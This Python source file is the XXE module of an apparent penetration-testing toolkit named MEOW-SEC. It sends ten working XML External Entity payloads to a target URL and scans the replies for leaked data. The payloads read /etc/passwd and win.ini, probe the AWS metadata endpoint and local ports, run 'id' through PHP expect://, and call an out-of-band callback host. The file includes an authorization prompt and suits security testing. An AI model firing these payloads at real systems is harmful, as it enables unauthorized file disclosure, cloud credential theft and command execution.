# -*- coding: utf-8 -*-
"""MEOW-SEC :: XXE — XML External Entity Injection Tester"""
import os, re, json
from datetime import datetime
from urllib.parse import urlparse

from core.ui import (console, show_module_banner, ok, err, info, warn, find,
                     ask_choice, G1, G2, CY, OR, RD, DM)
from core.cats import cat_talk, CAT_SCAN
from rich.panel  import Panel
from rich.table  import Table
from rich.prompt import Prompt, Confirm
from rich.rule   import Rule
from rich        import box

try:
    import requests as _req
    _req.packages.urllib3.disable_warnings()
    HAS_REQUESTS = True
except Exception:
    HAS_REQUESTS = False


def _save(name, target, results):
    os.makedirs("data", exist_ok=True)
    fname = f"data/{name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(fname, "w", encoding="utf-8") as f:
        json.dump({"target": target, "results": results,
                   "timestamp": datetime.now().isoformat()}, f, indent=2)
    ok(f"Results saved: [bold]{fname}[/]")


def _build_payloads(callback_url):
    cb = callback_url or "http://CALLBACK.example.com"
    return [
        ("Classic /etc/passwd",
         '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'),
        ("Classic win.ini",
         '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>'),
        ("SSRF AWS metadata",
         '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>'),
        ("SSRF localhost:22",
         '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://localhost:22/">]><root>&xxe;</root>'),
        ("Blind OOB",
         f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "{cb}/xxe">%xxe;]><root/>'),
        ("Error-based",
         '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///nonexistent/MEOW_XXE_ERR">]><root>&xxe;</root>'),
        ("CDATA exfil",
         '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><![CDATA[&xxe;]]></root>'),
        ("SVG XXE",
         '<?xml version="1.0" standalone="yes"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
         '<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'),
        ("PHP expect://",
         '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>'),
        ("SOAP XXE",
         '<?xml version="1.0"?><!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
         '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
         '<soap:Body>&xxe;</soap:Body></soap:Envelope>'),
    ]


_VULN_PATTERNS = [
    (r"root:x:0:0",              "HIGH", "passwd file content"),
    (r"\[fonts\]",               "HIGH", "win.ini content"),
    (r"latest/meta-data",        "HIGH", "AWS metadata SSRF"),
    (r"security-credentials",    "HIGH", "AWS credentials exposed"),
    (r"Connection refused",      "MEDIUM","SSRF port probe"),
    (r"uid=\d+",                 "HIGH", "RCE via PHP expect"),
    (r"MEOW_XXE_ERR",            "MEDIUM","error-based XXE"),
    (r"SYSTEM.*nonexistent",     "LOW",  "XXE entity processed"),
    (r"<!DOCTYPE",               "LOW",  "DOCTYPE reflected"),
]


def _detect(body: str):
    for pattern, sev, desc in _VULN_PATTERNS:
        if re.search(pattern, body, re.IGNORECASE):
            snippet = re.search(pattern, body, re.IGNORECASE)
            return sev, desc, snippet.group(0)[:60] if snippet else ""
    return None, None, ""


def run():
    show_module_banner("xxe")
    cat_talk(CAT_SCAN, "XML External Entity injection tester — 10 payloads", RD)
    console.print()
    warn("AUTHORIZED USE ONLY — Unauthorized testing is illegal.")
    if not Confirm.ask(f"  [{OR}]◈ I confirm this is an authorized target[/]", default=False):
        info("Aborted."); return

    if not HAS_REQUESTS:
        err("requests library not available. Install it: pip install requests"); return

    url = Prompt.ask(f"  [{G1}]◈ Target URL (endpoint that processes XML)[/]").strip()
    if not url.startswith("http"):
        url = "https://" + url

    callback_url = Prompt.ask(
        f"  [{CY}]◈ OOB callback URL (leave blank to skip blind payloads)[/]",
        default=""
    ).strip()

    payloads = _build_payloads(callback_url if callback_url else None)

    HEADERS_LIST = [
        {"Content-Type": "application/xml"},
        {"Content-Type": "text/xml"},
    ]

    results = []
    console.print()

    for pname, payload in payloads:
        for hdr in HEADERS_LIST:
            ct = hdr["Content-Type"]
            info(f"Testing: [{G1}]{pname}[/] — {ct}")
            try:
                resp = _req.post(url, data=payload.encode("utf-8"),
                                 headers={**hdr, "User-Agent": "MEOW-XXE/1.1"},
                                 verify=False, allow_redirects=False, timeout=10)
                body = resp.text
                sev, desc, evidence = _detect(body)
                status = str(resp.status_code)
                result = sev or ("REFLECTED" if "xxe" in body.lower() else "SAFE")
                if sev:
                    find(f"VULN [{sev}] {pname}: {desc} — {evidence}")
                results.append({
                    "payload": pname, "content_type": ct,
                    "status": status, "result": result,
                    "evidence": evidence, "severity": sev or "SAFE"
                })
            except Exception as e:
                results.append({
                    "payload": pname, "content_type": ct,
                    "status": "ERR", "result": str(e)[:40],
                    "evidence": "", "severity": "ERR"
                })

    console.print()
    t = Table(title=f"[{G1}]XXE Results[/]", box=box.MINIMAL_DOUBLE_HEAD,
              border_style=G2, header_style=CY)
    t.add_column("Payload",      min_width=22)
    t.add_column("Content-Type", min_width=18)
    t.add_column("Status",       min_width=7)
    t.add_column("Result",       min_width=10)
    t.add_column("Evidence",     min_width=30)

    sev_colors = {"HIGH": RD, "MEDIUM": OR, "LOW": CY, "SAFE": G2, "ERR": DM}
    for r in results:
        sc = sev_colors.get(r["severity"], DM)
        t.add_row(r["payload"], r["content_type"], r["status"],
                  f"[{sc}]{r['result']}[/]", r["evidence"])
    console.print(t)

    vulns = [r for r in results if r["severity"] not in ("SAFE", "ERR")]
    if vulns:
        find(f"{len(vulns)} XXE finding(s) detected!")
    else:
        ok("No XXE indicators found in responses.")

    _save("xxe", url, results)
